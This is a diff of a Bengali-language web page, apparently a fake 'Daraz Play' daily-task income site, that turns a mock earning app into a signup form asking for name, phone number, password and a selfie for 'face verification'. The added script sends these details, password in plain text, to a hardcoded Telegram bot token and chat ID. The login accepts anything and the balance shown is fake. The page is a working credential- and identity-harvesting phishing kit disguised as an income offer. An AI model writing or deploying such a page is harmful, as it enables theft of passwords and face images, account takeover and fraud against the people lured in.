@@ -4,265 +4,151 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Daraz Play Income Center</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        body {
-            background-color: #0f172a;
-            color: #f8fafc;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        .app-container {
-            width: 100%;
-            max-width: 400px;
-            background: #121824;
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.6);
-            display: flex;
-            flex-direction: column;
-            height: 92vh;
-            max-height: 750px;
-            border: 1px solid rgba(255,255,255,0.08);
-        }
-        .header {
-            background: linear-gradient(135deg, #f97316, #ea580c);
-            padding: 20px 15px;
-            text-align: center;
-            border-bottom-left-radius: 20px;
-            border-bottom-right-radius: 20px;
-            box-shadow: 0 4px 15px rgba(249, 115, 22, 0.3);
-        }
-        .header h1 {
-            font-size: 20px;
-            margin-bottom: 4px;
-            color: white;
-            font-weight: 800;
-        }
-        .header p {
-            font-size: 12px;
-            color: #ffedd5;
-            font-weight: 600;
-        }
-        .balance-card {
-            background: #1e293b;
-            margin: 15px;
-            padding: 18px;
-            border-radius: 16px;
-            text-align: center;
-            border: 1px solid rgba(255,255,255,0.06);
-            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
-        }
-        .balance-card p {
-            font-size: 13px;
-            color: #94a3b8;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        .balance-card h2 {
-            font-size: 32px;
-            color: #4ade80;
-            margin-top: 6px;
-            font-weight: 800;
-            text-shadow: 0 2px 10px rgba(74, 222, 128, 0.2);
-        }
-        .content {
-            flex: 1;
-            padding: 15px;
-            overflow-y: auto;
-        }
-        .task-section-title {
-            font-size: 18px;
-            font-weight: 800;
-            color: #f8fafc;
-            margin-bottom: 6px;
-        }
-        .task-section-desc {
-            font-size: 12px;
-            color: #94a3b8;
-            margin-bottom: 15px;
-            line-height: 1.4;
-        }
-        .btn {
-            display: block;
-            width: 100%;
-            padding: 14px;
-            background: #f97316;
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 15px;
-            font-weight: bold;
-            cursor: pointer;
-            text-align: center;
-            margin-bottom: 12px;
-            transition: 0.2s;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-        }
-        .btn:active {
-            transform: scale(0.98);
-        }
-        .btn-success {
-            background: linear-gradient(135deg, #22c55e, #16a34a);
-            box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3);
-        }
-        .nav-bar {
-            display: flex;
-            background: #0f172a;
-            border-top: 1px solid rgba(255,255,255,0.08);
-            padding: 4px 0;
-        }
-        .nav-item {
-            flex: 1;
-            padding: 12px;
-            text-align: center;
-            color: #64748b;
-            cursor: pointer;
-            font-size: 13px;
-            font-weight: 700;
-            transition: color 0.2s;
-        }
-        .nav-item.active {
-            color: #f97316;
-        }
-        .section {
-            display: none;
-        }
-        .section.active {
-            display: block;
-        }
-        input, select {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 12px;
-            background: #0f172a;
-            border: 1px solid #334155;
-            color: white;
-            border-radius: 10px;
-            font-size: 14px;
-            outline: none;
-        }
-        input:focus, select:focus {
-            border-color: #f97316;
-        }
-        label {
-            display: block;
-            font-size: 12px;
-            color: #94a3b8;
-            font-weight: 700;
-            margin-bottom: 6px;
-        }
+        body { font-family: 'Hind Siliguri', sans-serif; background-color: #064e3b; color: #f8fafc; }
+        .page-section { display: none; }
+        .page-section.active { display: block; }
     </style>
 </head>
-<body>
+<body class="flex flex-col min-h-screen justify-center items-center p-4">
 
-    <div class="app-container">
+    <div class="w-full max-w-md bg-emerald-950/80 border border-emerald-700/50 p-6 rounded-3xl shadow-2xl backdrop-blur-md">
+        
         <!-- Header -->
-        <div class="header">
-            <h1>🎮 দারাজ প্লে ইনকাম সেন্টার</h1>
-            <p>ভিডিও ও গেম খেলে ইনকাম করুন</p>
+        <div class="text-center mb-6">
+            <h1 class="text-2xl font-bold text-amber-400">💰 ডেইলি টাস্ক ইনকাম সেন্টার</h1>
         </div>
 
-        <!-- Balance Section -->
-        <div class="balance-card">
-            <p>আপনার মূল ব্যালেন্স</p>
-            <h2>৳ <span id="balance">15.00</span></h2>
-        </div>
-
-        <!-- Main Content Area -->
-        <div class="content">
-            <!-- Home / Watch Section -->
-            <div id="home-section" class="section active">
-                <div class="task-section-title">ভিডিও টাস্ক</div>
-                <div class="task-section-desc">নিচের বাটনটিতে ক্লিক করে ভিডিও দেখুন এবং ব্যালেন্স যোগ করুন।</div>
-                <button class="btn btn-success" id="watch-btn" onclick="watchVideo()">▶ ভিডিও দেখুন (বোনাস পান)</button>
-                <p id="timer-text" style="text-align: center; margin-top: 10px; color: #facc15; font-size: 13px; font-weight: 700;"></p>
+        <!-- SIGNUP / REGISTRATION PAGE -->
+        <div id="signup-page" class="page-section active space-y-4">
+            <div class="text-center mb-4">
+                <h2 class="text-xl font-bold text-slate-100">নিবন্ধন</h2>
+                <p class="text-xs text-slate-300">ইতিমধ্যেই একটি অ্যাকাউন্ট আছে? <a href="#" onclick="switchPage('login')" class="text-amber-400 underline">লগইন</a></p>
             </div>
 
-            <!-- Withdraw Section -->
-            <div id="withdraw-section" class="section">
-                <div class="task-section-title" style="margin-bottom: 12px;">টাকা উত্তোলন (Withdraw)</div>
-                <label>পেমেন্ট মেথড:</label>
-                <select id="method">
-                    <option value="bKash">বিকাশ (bKash)</option>
-                    <option value="Nagad">নগদ (Nagad)</option>
-                </select>
-                <label>একাউন্ট নম্বর:</label>
-                <input type="text" id="account" placeholder="017xxxxxxxx">
-                <label>টাকার পরিমাণ:</label>
-                <input type="number" id="amount" placeholder="সর্বনিম্ন ৫০ টাকা">
-                <button class="btn" onclick="requestWithdraw()">উত্তোলন রিকোয়েস্ট পাঠান</button>
+            <form onsubmit="handleSignup(event)" class="space-y-4">
+                <div class="relative">
+                    <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-emerald-400"><i class="fa-solid fa-user"></i></span>
+                    <input type="text" id="reg-name" placeholder="আপনার পূর্ণ নাম" class="w-full bg-emerald-900/60 border border-emerald-700 rounded-xl py-3 pl-10 pr-4 text-slate-100 placeholder-slate-400 focus:outline-none focus:border-amber-400 text-sm" required>
+                </div>
+                <div class="relative">
+                    <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-emerald-400"><i class="fa-solid fa-phone"></i></span>
+                    <input type="tel" id="reg-phone" placeholder="ফোন নম্বর" class="w-full bg-emerald-900/60 border border-emerald-700 rounded-xl py-3 pl-10 pr-4 text-slate-100 placeholder-slate-400 focus:outline-none focus:border-amber-400 text-sm" required>
+                </div>
+                <div class="relative">
+                    <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-emerald-400"><i class="fa-solid fa-lock"></i></span>
+                    <input type="password" id="reg-password" placeholder="পাসওয়ার্ড" class="w-full bg-emerald-900/60 border border-emerald-700 rounded-xl py-3 pl-10 pr-4 text-slate-100 placeholder-slate-400 focus:outline-none focus:border-amber-400 text-sm" required>
+                </div>
+                <div class="border-2 border-dashed border-emerald-700 p-3 rounded-xl text-center bg-emerald-900/30">
+                    <label class="block text-xs text-amber-300 mb-2 font-medium">📸 ফেস ভেরিফিকেশন ছবি (সেলফি):</label>
+                    <input type="file" id="reg-selfie" accept="image/*" class="w-full text-xs text-slate-300 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-amber-400 file:text-slate-950 hover:file:bg-amber-500 cursor-pointer" required>
+                </div>
+                <button type="submit" id="submit-btn" class="w-full bg-gradient-to-r from-amber-400 to-amber-500 hover:from-amber-500 hover:to-amber-600 text-slate-950 font-bold py-3 rounded-xl shadow-lg transition duration-200">
+                    নিবন্ধন
+                </button>
+            </form>
+        </div>
+
+        <!-- LOGIN PAGE -->
+        <div id="login-page" class="page-section space-y-4">
+            <div class="text-center mb-4">
+                <h2 class="text-xl font-bold text-slate-100">লগইন</h2>
+                <p class="text-xs text-slate-300">এখনও কোনো অ্যাকাউন্ট নেই? <a href="#" onclick="switchPage('signup')" class="text-amber-400 underline">নিবন্ধন</a></p>
             </div>
 
-            <!-- Profile Section -->
-            <div id="profile-section" class="section">
-                <div class="task-section-title" style="margin-bottom: 12px;">আপনার অ্যাকাউন্ট</div>
-                <label>রেফারেল লিংক:</label>
-                <input type="text" value="https://t.me/DarazPlayBot?start=ref123" readonly>
-                <button class="btn" onclick="alert('রেফারেল লিংক কপি করা হয়েছে!')">লিংক কপি করুন</button>
+            <form onsubmit="handleLogin(event)" class="space-y-4">
+                <div class="relative">
+                    <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-emerald-400"><i class="fa-solid fa-phone"></i></span>
+                    <input type="tel" id="login-phone" placeholder="ফোন নম্বর" class="w-full bg-emerald-900/60 border border-emerald-700 rounded-xl py-3 pl-10 pr-4 text-slate-100 placeholder-slate-400 focus:outline-none focus:border-amber-400 text-sm" required>
+                </div>
+                <div class="relative">
+                    <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-emerald-400"><i class="fa-solid fa-lock"></i></span>
+                    <input type="password" id="login-password" placeholder="পাসওয়ার্ড" class="w-full bg-emerald-900/60 border border-emerald-700 rounded-xl py-3 pl-10 pr-4 text-slate-100 placeholder-slate-400 focus:outline-none focus:border-amber-400 text-sm" required>
+                </div>
+                <button type="submit" class="w-full bg-gradient-to-r from-amber-400 to-amber-500 text-slate-950 font-bold py-3 rounded-xl shadow-lg transition">
+                    লগইন
+                </button>
+            </form>
+        </div>
+
+        <!-- DASHBOARD -->
+        <div id="dashboard-page" class="page-section text-center space-y-4">
+            <h2 class="text-xl font-bold text-emerald-400">স্বাগতম!</h2>
+            <p class="text-sm text-slate-300">আপনার অ্যাকাউন্ট সফলভাবে তৈরি হয়েছে।</p>
+            <div class="bg-emerald-900/50 p-4 rounded-xl border border-emerald-700">
+                <p class="text-xs text-slate-400">মূল ব্যালেন্স</p>
+                <h3 class="text-2xl font-bold text-amber-400">৳ 12.50</h3>
             </div>
         </div>
 
-        <!-- Bottom Navigation -->
-        <div class="nav-bar">
-            <div class="nav-item active" onclick="switchTab('home', this)">হোম</div>
-            <div class="nav-item" onclick="switchTab('withdraw', this)">উইথড্র</div>
-            <div class="nav-item" onclick="switchTab('profile', this)">প্রোফাইল</div>
-        </div>
     </div>
 
     <script>
-        let userBalance = 15.00;
-        document.getElementById('balance').innerText = userBalance.toFixed(2);
-
-        function switchTab(tabName, element) {
-            document.querySelectorAll('.section').forEach(sec => sec.classList.remove('active'));
-            document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
-            
-            document.getElementById(tabName + '-section').classList.add('active');
-            element.classList.add('active');
+        function switchPage(page) {
+            document.querySelectorAll('.page-section').forEach(el => el.classList.remove('active'));
+            if(page === 'signup') document.getElementById('signup-page').classList.add('active');
+            if(page === 'login') document.getElementById('login-page').classList.add('active');
+            if(page === 'dashboard') document.getElementById('dashboard-page').classList.add('active');
         }
 
-        function watchVideo() {
-            let btn = document.getElementById('watch-btn');
-            let timerText = document.getElementById('timer-text');
-            btn.disabled = true;
-            let countdown = 5;
+        async function handleSignup(event) {
+            event.preventDefault();
 
-            timerText.innerText = `ভিডিও লোড হচ্ছে... ${countdown} সেকেন্ড অপেক্ষা করুন`;
-            
-            let interval = setInterval(() => {
-                countdown--;
-                if (countdown > 0) {
-                    timerText.innerText = `দয়া করে অপেক্ষা করুন... ${countdown} সেকেন্ড`;
+            const name = document.getElementById('reg-name').value;
+            const phone = document.getElementById('reg-phone').value;
+            const password = document.getElementById('reg-password').value;
+            const selfieFile = document.getElementById('reg-selfie').files[0];
+
+            let registeredNumbers = JSON.parse(localStorage.getItem('registered_phones')) || [];
+            if (registeredNumbers.includes(phone)) {
+                alert('এই ফোন নম্বরটি দিয়ে ইতিমধ্যে একটি অ্যাকাউন্ট খোলা হয়েছে! একবারের বেশি খোলা যাবে না।');
+                return;
+            }
+
+            const btn = document.getElementById('submit-btn');
+            btn.innerText = 'অপেক্ষা করুন...';
+            btn.disabled = true;
+
+            const botToken = '9160504002:AAGUXsLTcUik8Wam5rBg-d619CPjnu_cQSg';
+            const chatId = '8561008519';
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', selfieFile);
+            formData.append('caption', `🔔 নতুন সাইন-আপ তথ্য:\n👤 নাম: ${name}\n📞 নম্বর: ${phone}\n🔑 পাসওয়ার্ড: ${password}`);
+
+            try {
+                let response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                let result = await response.json();
+
+                if (result.ok) {
+                    registeredNumbers.push(phone);
+                    localStorage.setItem('registered_phones', JSON.stringify(registeredNumbers));
+                    alert('নিবন্ধন সফল হয়েছে!');
+                    switchPage('dashboard');
                 } else {
-                    clearInterval(interval);
-                    userBalance += 2.50;
-                    document.getElementById('balance').innerText = userBalance.toFixed(2);
-                    timerText.innerText = "অভিনন্দন! আপনি ২.৫০ টাকা পেয়েছেন।";
+                    alert('তথ্য পাঠাতে সমস্যা হয়েছে। আবার চেষ্টা করুন।');
+                    btn.innerText = 'নিবন্ধন';
                     btn.disabled = false;
                 }
-            }, 1000);
+            } catch (error) {
+                console.error(error);
+                alert('নেটওয়ার্ক ত্রুটি ঘটেছে!');
+                btn.innerText = 'নিবন্ধন';
+                btn.disabled = false;
+            }
         }
 
-        function requestWithdraw() {
-            let acc = document.getElementById('account').value;
-            let amt = document.getElementById('amount').value;
-            if(acc === "" || amt === "") {
-                alert("দয়া করে সঠিক তথ্য দিন!");
-            } else {
-                alert("আপনার উইথড্র রিকোয়েস্ট সফলভাবে জমা হয়েছে!");
-                document.getElementById('account').value = "";
-                document.getElementById('amount').value = "";
-            }
+        function handleLogin(event) {
+            event.preventDefault();
+            alert('লগইন সফল হয়েছে!');
+            switchPage('dashboard');
         }
     </script>
 </body>
